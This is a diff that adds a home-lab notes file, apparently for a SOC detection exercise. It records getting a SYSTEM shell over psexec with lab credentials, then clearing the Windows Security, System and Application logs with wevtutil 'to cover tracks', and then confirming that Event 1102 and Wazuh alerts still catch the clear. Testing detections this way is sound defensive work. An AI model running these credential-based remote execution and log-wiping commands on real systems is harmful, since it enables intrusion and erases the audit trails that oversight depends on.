@@ -1,0 +1,26 @@
+# Kali commands — SOC-Case-Event-Log-Clearing (192.168.100.106 -> 192.168.100.108)
+# Actual commands run.
+
+# Foothold: SYSTEM shell
+impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
+#   v0.14.0 — ADMIN$ upload QjDJVASl.exe, service OJKp -> C:\Windows\system32>
+
+# --- inside psexec shell ---
+
+# Clear all three main logs (cover tracks)
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+#   (no output = success)
+
+# Verify Security log cleared
+wevtutil gli Security
+#   numberOfLogRecords: 17, oldestRecordNumber: 1 (restarted = cleared), fileSize 69632
+
+# Confirm 1102 survived the clear
+powershell -c "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 1 | Format-List Id,TimeCreated,Message"
+#   Id: 1102, TimeCreated: 10/31/2026 9:45:56 AM, Message: "The audit log was cleared." (Subject: SYSTEM, S-1-5-18)
+
+# --- Wazuh detection ---
+# rule.id 63103 (level 5) fired on 1102; Sysmon 1 captured wevtutil.exe cl Security; Event ID 104 for System/Application clear.
+# Pre-clear events still intact in Wazuh (SIEM copy survives endpoint clear).
